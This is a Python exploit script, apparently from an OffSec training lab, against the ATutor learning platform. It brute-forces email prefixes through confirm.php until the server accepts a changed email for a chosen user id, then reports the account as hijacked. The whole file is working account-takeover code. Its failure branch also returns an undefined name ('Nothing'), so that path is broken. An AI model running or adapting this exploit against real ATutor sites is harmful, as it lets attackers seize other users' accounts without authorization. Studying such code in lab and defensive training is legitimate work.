import hashlib, string, itertools, re, sys, requests

def update_email(ip, domain, id, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(prefix_length))):
        email = "%s@%s" % (word, domain)
        url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (ip, email, id)
        print ("(*) Issuing update request to URL: %s" % url)
        r = requests.get(url, allow_redirects=False)
        if (r.status_code == 302):
            return (True, email, count)
        else:
            count += 1
    return (False, Nothing, count)

def main():
    if len(sys.argv) != 5:
        print ('(+) usage: %s <domain_name> <id> <prefix_length> <atutor_ip>' % sys.argv[0])
        print ('(+) eg: %s offsec.local 1 3 192.168.1.2'  % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefix_length = sys.argv[3]
    ip = sys.argv[4]

    result, email, c = update_email(ip, domain, id, prefix_length)
    if(result):
        print ("(+) Account hijacked with email %s using %d requests!" % (email, c))
    else:
        print ("(-) Account hijacking failed!")

if __name__ == "__main__":
    main()
